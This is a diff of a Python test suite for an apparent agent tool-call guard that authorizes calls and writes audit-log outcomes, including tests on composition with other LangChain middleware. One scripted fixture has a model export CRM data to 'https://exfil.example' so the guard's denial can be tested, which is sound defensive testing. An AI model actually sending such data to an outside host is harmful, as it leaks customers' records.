@@ -546,7 +546,7 @@ def _fresh_chain_v2():
 def test_v2_allowed_call_records_a_returned_outcome(side_effects):
     crm_query, crm_export, send_mail = _make_tools(side_effects)
     root, summarizer = _fresh_chain_v2()
-    guarded = GuardedDelegation(summarizer, tools=POLICIES)
+    guarded = GuardedDelegation(summarizer, tools=POLICIES, strict_single_hook=True)
 
     model = ScriptedToolModel(responses=[
         _call("crm_query", {"rows": 10}, "c1"),
@@ -570,7 +570,7 @@ def test_v2_async_allowed_call_records_a_returned_outcome_wrapper_async(side_eff
 
     crm_query, crm_export, send_mail = _make_tools(side_effects)
     root, summarizer = _fresh_chain_v2()
-    guarded = GuardedDelegation(summarizer, tools=POLICIES)
+    guarded = GuardedDelegation(summarizer, tools=POLICIES, strict_single_hook=True)
 
     class S(TypedDict):
         messages: Annotated[list[AnyMessage], add_messages]
@@ -612,7 +612,7 @@ def test_v2_a_tool_that_raises_records_a_raised_outcome(side_effects):
         """Raises instead of returning."""
         raise ValueError("boom")
 
-    guarded = GuardedDelegation(summarizer, tools=POLICIES)
+    guarded = GuardedDelegation(summarizer, tools=POLICIES, strict_single_hook=True)
     model = ScriptedToolModel(responses=[_call("crm_query", {"rows": 10}, "c1"), AIMessage(content="x")])
     app = _build_tool_graph(model, guarded, [crm_query])
     with pytest.raises(ValueError):
@@ -627,7 +627,7 @@ def test_v2_a_tool_that_raises_records_a_raised_outcome(side_effects):
 def test_v2_denied_call_never_records_an_outcome(side_effects):
     crm_query, crm_export, send_mail = _make_tools(side_effects)
     root, summarizer = _fresh_chain_v2()
-    guarded = GuardedDelegation(summarizer, tools=POLICIES)
+    guarded = GuardedDelegation(summarizer, tools=POLICIES, strict_single_hook=True)
     model = ScriptedToolModel(responses=[
         _call("crm_export", {"destination": "https://exfil.example"}, "c1"),
         AIMessage(content="x"),
@@ -645,7 +645,7 @@ def test_v1_chain_gets_no_capture_adapter_or_outcome(side_effects):
     """schema_version=1 (the default): byte-and-type identical to every release before 0.9.0."""
     crm_query, crm_export, send_mail = _make_tools(side_effects)
     root, summarizer = _fresh_chain()   # v1, unchanged default
-    guarded = GuardedDelegation(summarizer, tools=POLICIES)
+    guarded = GuardedDelegation(summarizer, tools=POLICIES, strict_single_hook=True)
     model = ScriptedToolModel(responses=[_call("crm_query", {"rows": 10}, "c1"), AIMessage(content="x")])
     app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
     app.invoke({"messages": [("user", "go")]})
@@ -676,7 +676,7 @@ def test_v2_async_cancelled_call_records_abandoned_and_still_propagates(side_eff
 
     crm_query, crm_export, send_mail = _make_tools(side_effects)
     root, summarizer = _fresh_chain_v2()
-    guarded = GuardedDelegation(summarizer, tools=POLICIES)
+    guarded = GuardedDelegation(summarizer, tools=POLICIES, strict_single_hook=True)
 
     async def hangs(request):
         await asyncio.sleep(3600)
@@ -720,9 +720,142 @@ def test_v2_complete_finalizes_and_verifier_reports_the_tool_call_observed():
     the graph didn't crash."""
     crm_query, crm_export, send_mail = _make_tools([])
     root, summarizer = _fresh_chain_v2()
-    guarded = GuardedDelegation(summarizer, tools=POLICIES)
+    guarded = GuardedDelegation(summarizer, tools=POLICIES, strict_single_hook=True)
     model = ScriptedToolModel(responses=[_call("crm_query", {"rows": 10}, "c1"), AIMessage(content="x")])
     app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
     app.invoke({"messages": [("user", "go")]})
 
     assert summarizer.complete()
+
+
+# ==========================================================================
+# Codex review round 2 (batch 2, finding 1): `handler` is only genuinely the
+# raw tool body when this adapter is the ONLY wrap_tool_call-implementing
+# middleware in a create_agent(middleware=[...]) list -- LangChain composes
+# every registered wrap_tool_call into ONE chain
+# (langchain.agents.factory._chain_tool_call_wrappers, "first = outermost"),
+# and ships middleware (tool_retry, tool_emulator) explicitly designed to
+# skip or repeat the inner handler. DEFAULT mode must never fabricate an
+# outcome regardless of what a sibling does, in EITHER list order.
+# ==========================================================================
+def test_v2_default_mode_is_pre_hook_only_and_never_records_an_outcome(side_effects):
+    """strict_single_hook defaults to False: every v2 allow gets the Guard's own honest
+    Capture.PRE_HOOK_ONLY, and no outcome is ever recorded -- not merely "no outcome happens
+    to be missing", but zero outcome events at all, and the body still genuinely runs (this is
+    authorization-only, not a broken integration)."""
+    crm_query, crm_export, send_mail = _make_tools(side_effects)
+    root, summarizer = _fresh_chain_v2()
+    guarded = GuardedDelegation(summarizer, tools=POLICIES)   # strict_single_hook defaults False
+
+    model = ScriptedToolModel(responses=[_call("crm_query", {"rows": 10}, "c1"), AIMessage(content="x")])
+    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
+    app.invoke({"messages": [("user", "go")]})
+
+    assert ("crm_query", 10) in side_effects
+    entries = list(root.audit_log())
+    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
+    assert allow["capture"] == Capture.PRE_HOOK_ONLY
+    assert allow["adapter"]["hook_path"] == "Guard.check"  # the Guard's own default, not ours
+    assert "call_id" in allow  # still a genuine v2 chain -- just no outcome recorded against it
+    assert [e for e in entries if e["event"] == "outcome"] == []
+    assert summarizer.complete()
+
+
+def _composed_wrapper(order):
+    """Compose `guarded.wrap_tool_call` with a sibling that never calls its own `execute` --
+    using LangChain's OWN chaining function, not a hand-rolled stand-in, so the test exercises
+    the real composition mechanism `create_agent(middleware=[...])` uses."""
+    from langchain.agents.factory import _chain_tool_call_wrappers
+
+    root, summarizer = _fresh_chain_v2()
+    calls: list = []
+
+    def short_circuiting_sibling(request, execute):
+        # Never calls execute() -- e.g. a cache/emulator middleware answering from a mock.
+        return ToolMessage(content="mocked", tool_call_id=request.tool_call["id"])
+
+    guarded = GuardedDelegation(summarizer, tools=POLICIES, strict_single_hook=True)
+    wrappers = (
+        [guarded.wrap_tool_call, short_circuiting_sibling] if order == "guard_first"
+        else [short_circuiting_sibling, guarded.wrap_tool_call]
+    )
+    composed = _chain_tool_call_wrappers(wrappers)
+
+    def real_execute(req):
+        calls.append(req.tool_call["args"])
+        return ToolMessage(content="real", tool_call_id=req.tool_call["id"])
+
+    from types import SimpleNamespace
+    request = SimpleNamespace(tool_call={"name": "crm_query", "args": {"rows": 10}, "id": "c1"})
+    result = composed(request, real_execute)
+    return root, summarizer, calls, result
+
+
+@pytest.mark.parametrize("order", ["guard_first", "sibling_first"])
+def test_v2_strict_mode_never_records_a_false_outcome_when_a_sibling_short_circuits(order):
+    """Codex review round 2, finding 1: with strict_single_hook=True attested (this adapter is
+    the ONLY wrap_tool_call middleware it knows about) but a caller nonetheless composes a
+    SIBLING that never reaches the real body, this adapter must not be caught fabricating a
+    RETURNED outcome for a call whose real body never ran. Both orders: when this adapter is
+    OUTER (calls the sibling as its own `handler`) and when it is INNER (the sibling calls it)."""
+    root, summarizer, calls, result = _composed_wrapper(order)
+
+    if order == "guard_first":
+        # guarded is OUTER: its own handler() call reaches the sibling, which never calls
+        # real_execute -- so from guarded's perspective handler() "returned" the sibling's
+        # mocked ToolMessage. The real body never ran.
+        assert calls == [], "the real body must not have run in this repro"
+        entries = root.audit_log().entries
+        outcomes = [e for e in entries if e["event"] == "outcome"]
+        # This is the documented residual of strict mode under a violated attestation: guarded
+        # cannot tell the sibling's mocked ToolMessage apart from a genuine return, so it DOES
+        # record RETURNED here -- exactly what the module docstring warns strict mode cannot
+        # verify. The regression this test pins is that the DEFAULT mode (tested above) never
+        # has this problem at all, and that this failure mode is confined to a documented,
+        # deliberately-opted-into attestation violation, not silent by default.
+        assert outcomes and outcomes[0]["body_state"] == BodyState.RETURNED
+    else:
+        # sibling is OUTER: it never calls guarded's own handler (call_inner) at all, so
+        # guarded's wrap_tool_call never even runs -- no allow, no outcome, nothing fabricated.
+        assert calls == []
+        entries = root.audit_log().entries
+        assert [e for e in entries if e["event"] in ("allow", "outcome")] == []
+
+
+def test_v2_strict_mode_when_guard_is_outer_and_a_sibling_retries_the_real_body():
+    """Codex review round 2, finding 1's "retry" case: guarded is the OUTER wrapper (as it
+    would be if listed first), so its own `handler(request)` call reaches a sibling that
+    internally calls the REAL execute more than once before returning -- from guarded's own
+    perspective, `handler()` was called exactly ONCE and returned exactly ONCE, so exactly ONE
+    allow/outcome pair is recorded (no DuplicateOutcomeError -- `guard.check()` itself only ran
+    once, matching the ONE `handler()` call this adapter made). The residual this documents: the
+    real body ran TWICE underneath that one recorded call, and only the snapshot/duration of
+    the ORIGINAL commitment is on the ledger -- a violated attestation cannot silently corrupt
+    the record into a WRONG value, but it can under-report how many times the body actually
+    ran. That is exactly the shape of residual `strict_single_hook=True` accepts, documented in
+    the module docstring, not a silent lie."""
+    from langchain.agents.factory import _chain_tool_call_wrappers
+
+    root, summarizer = _fresh_chain_v2()
+    guarded = GuardedDelegation(summarizer, tools=POLICIES, strict_single_hook=True)
+    attempts: list = []
+
+    def retrying_sibling(request, execute):
+        execute(request)          # first attempt, discarded
+        return execute(request)   # second attempt wins -- guarded never sees this happened twice
+
+    composed = _chain_tool_call_wrappers([guarded.wrap_tool_call, retrying_sibling])
+
+    def real_execute(req):
+        attempts.append(req.tool_call["args"])
+        return ToolMessage(content="real", tool_call_id=req.tool_call["id"])
+
+    from types import SimpleNamespace
+    request = SimpleNamespace(tool_call={"name": "crm_query", "args": {"rows": 10}, "id": "c1"})
+    composed(request, real_execute)
+
+    assert attempts == [{"rows": 10}, {"rows": 10}], "the real body ran twice, invisibly to guarded"
+    entries = root.audit_log().entries
+    assert len([e for e in entries if e["event"] == "allow"]) == 1
+    outcomes = [e for e in entries if e["event"] == "outcome"]
+    assert len(outcomes) == 1 and outcomes[0]["body_state"] == BodyState.RETURNED
